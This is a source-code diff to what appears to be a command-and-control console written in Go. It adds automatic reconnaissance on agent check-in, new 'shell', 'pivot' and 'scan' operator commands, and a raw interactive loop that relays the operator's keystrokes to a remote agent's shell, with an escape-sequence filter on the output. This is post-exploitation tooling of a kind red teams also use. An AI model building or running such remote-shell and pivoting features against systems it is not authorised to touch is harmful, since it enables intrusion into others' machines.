@@ -670,6 +670,9 @@ func (c *Console) acceptLoop(ln net.Listener, entry *listenerEntry) {
 		sessOpts.persistMu = &c.persistMu
 
 		if isAgent {
+			if sessOpts.autoRecon {
+				sessOpts.agentReadyCb = func(s *Session) { c.cmdReconAgent(s) }
+			}
 			go func(s *Session, o sessionOpts, e *listenerEntry) {
 				handleAgentSession(s, o)
 				atomic.AddInt32(&e.sessionCount, -1)
@@ -727,6 +730,12 @@ func (c *Console) Run() {
 			c.cmdExec(args)
 		case "ps":
 			c.cmdPs(args)
+		case "shell":
+			c.cmdShell(args)
+		case "pivot":
+			c.cmdPivot(args)
+		case "scan":
+			c.cmdScan(args)
 		case "killproc":
 			c.cmdKillproc(args)
 		case "export":
@@ -886,8 +895,8 @@ const (
 
 // process filters p and returns bytes safe to write to the operator's terminal.
 // apcDetected is true on the first call that encounters an APC sequence.
-// NOTE: This filter is stateful across calls - incomplete escape sequences at chunk
-// boundaries are preserved in the state machine.
+// The filter is byte-by-byte and f.state persists across calls, so sequences
+// split across TCP chunk boundaries are handled correctly.
 func (f *interactiveFilter) process(p []byte) (out []byte, apcDetected bool) {
 	for _, b := range p {
 		switch f.state {
@@ -1331,5 +1340,108 @@ func (c *Console) interactWithSession(sess *Session) {
 		c.startDrain(sess, conn)
 		fmt.Printf("\r\n[*] Session [%d] backgrounded.\n", sess.ID)
 	}
+}
+
+// shellInteract is the raw I/O loop for 'shell <id>' agent sessions.
+// conn is the relay TCP connection to the agent's shell subprocess.
+// Ctrl+D closes the shell.  Ctrl+C is forwarded.
+// Blocks until the shell exits or the relay closes.
+func (c *Console) shellInteract(sessID int, conn net.Conn) {
+	fd := int(os.Stdin.Fd())
+	if !term.IsTerminal(fd) {
+		fmt.Println("[!] stdin is not a TTY — interactive mode unavailable")
+		return
+	}
+
+	fmt.Printf("[*] Shell session %d — Ctrl+D to close\n", sessID)
+
+	oldState, err := term.MakeRaw(fd)
+	if err != nil {
+		fmt.Printf("[!] raw mode: %v\n", err)
+		return
+	}
+
+	remoteDone := make(chan struct{})
+	stdinDone := make(chan struct{})
+	cancelCh := make(chan struct{})
+	var cancelOnce sync.Once
+	cancelStdin := func() { cancelOnce.Do(func() { close(cancelCh) }) }
+
+	// remote → stdout with ANSI safety filter.
+	go func() {
+		defer close(remoteDone)
+		flt := &interactiveFilter{}
+		buf := make([]byte, 4096)
+		for {
+			n, readErr := conn.Read(buf)
+			if n > 0 {
+				safe, apcDetected := flt.process(buf[:n])
+				if apcDetected {
+					os.Stdout.Write([]byte("\r\n[!] APC sequence stripped\r\n")) //nolint:errcheck
+				}
+				if len(safe) > 0 {
+					os.Stdout.Write(safe) //nolint:errcheck
+					os.Stdout.Sync()      //nolint:errcheck
+				}
+			}
+			if readErr != nil {
+				return
+			}
+		}
+	}()
+
+	// stdin → remote; Ctrl+D closes the relay.
+	go func() {
+		defer close(stdinDone)
+		buf := make([]byte, 1)
+		for {
+			var rfds unix.FdSet
+			rfds.Bits[fd>>6] |= int64(1) << (uint(fd) & 63)
+			tv := unix.Timeval{Sec: 0, Usec: 50_000}
+			n, selErr := unix.Select(fd+1, &rfds, nil, nil, &tv)
+			if selErr != nil {
+				if selErr == syscall.EINTR {
+					continue
+				}
+				return
+			}
+			if n == 0 {
+				select {
+				case <-cancelCh:
+					return
+				default:
+					continue
+				}
+			}
+			if _, readErr := os.Stdin.Read(buf); readErr != nil {
+				return
+			}
+			if buf[0] == 0x04 { // Ctrl+D → close shell
+				conn.Close()
+				return
+			}
+			if _, writeErr := conn.Write(buf); writeErr != nil {
+				return
+			}
+		}
+	}()
+
+	select {
+	case <-remoteDone:
+		cancelStdin()
+		select {
+		case <-stdinDone:
+		case <-time.After(150 * time.Millisecond):
+		}
+	case <-stdinDone:
+		conn.Close()
+		select {
+		case <-remoteDone:
+		case <-time.After(500 * time.Millisecond):
+		}
+	}
+
+	term.Restore(fd, oldState) //nolint:errcheck
+	fmt.Printf("\r\n[*] Shell session %d closed.\n", sessID)
 }
 
